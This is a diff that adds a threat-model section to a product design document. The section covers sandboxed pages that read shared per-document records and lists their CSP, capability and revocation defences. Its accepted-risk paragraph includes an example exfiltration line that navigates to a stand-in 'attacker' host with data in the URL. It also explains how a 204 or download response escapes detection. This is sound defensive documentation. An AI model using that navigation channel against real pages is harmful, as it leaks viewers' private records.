@@ -412,6 +412,47 @@ the threat model:
   interstitial via sandbox navigation restrictions would break legitimate
   in-artifact links, so this stands as an accepted, documented risk.
 
+### Shared records: pages that read records (threat model)
+
+A page reads and writes per-document records (`doc_records`, shared or
+personal to the viewer) only if its head says
+`<meta name="primer-records" content="read">`. Records are worth more than
+page content (votes, sign-ups, what other viewers typed), so such pages get
+everything the CSP and the host can take away:
+
+- **Complete outbound lockdown.** The content route reads the opt-in from the
+  stored page and serves it with `artifactCsp('records')`: no remote scripts,
+  styles, fonts or images (inline and `blob:` only), `connect-src`,
+  `form-action`, `frame-src`, `media-src` and `object-src` `'none'`,
+  `base-uri 'none'`. That closes the `img-src https:` channel.
+- **No bridge way out.** The host grants such pages the `records` feature
+  and drops their `open_external` (the companion stops forwarding link
+  clicks too). Until the host has learned the page's policy from the server
+  (`GET /api/versions/:versionId/page`, from the same stored bytes) it sends
+  no `init`, so the page has no port to call through.
+- **A document-bound capability.** The host binds records calls to the
+  page's own document; `args` are rebuilt from an allow-list, so a page can't
+  name another document or another person's personal records. The server
+  decides access per viewer on every call (shared read: readers; writes:
+  owner, editor, responder; personal: the caller's own rows only). At most 8
+  calls in flight, 5 s each, 256 KB per call, 200 records per page.
+- **Navigation revokes.** A record-reading frame that loads a second time
+  navigated itself. The host revokes its record access at once (in-flight
+  calls fail, later ones are refused), closes its change feed and reloads the
+  page from Primer with a fresh capability (at most three times, then it
+  stays revoked).
+
+**Residual risk (accepted).** Nothing stops a sandboxed frame from
+navigating itself (`location.href = 'https://attacker/?d=…'`), and no CSP
+directive blocks it today. Whatever records the page had already read when it
+navigates can leave in that URL. Revocation is a reaction to the navigation's
+`load`, not a prevention: it bounds the leak to data read before the first
+navigation, as long as the navigation produces a `load` in the frame. A
+navigation answered with `204 No Content` or a download leaves the page in
+place and fires no `load`, so the host cannot see it and the page can repeat
+it. Treat any record a viewer can read as readable by any page they open on
+that document that opted in to records; keep secrets out of records.
+
 ### Anchor resolution & drift handling
 
 When a user makes a selection, the companion script generates an anchor with both text-range data (primary) and element-path data (for the containing element). On render, the script attempts text-range resolution first: find the unique occurrence of `prefix + selectorText + suffix` within the document. If that fails (text changed or duplicated), it falls back to element-path: locate the element by selector path and verify the inner-content hash. If that also fails, the anchor is marked "drifted" — the comment still appears in the sidebar with a small "this comment's location could not be determined" indicator, but no in-iframe marker.
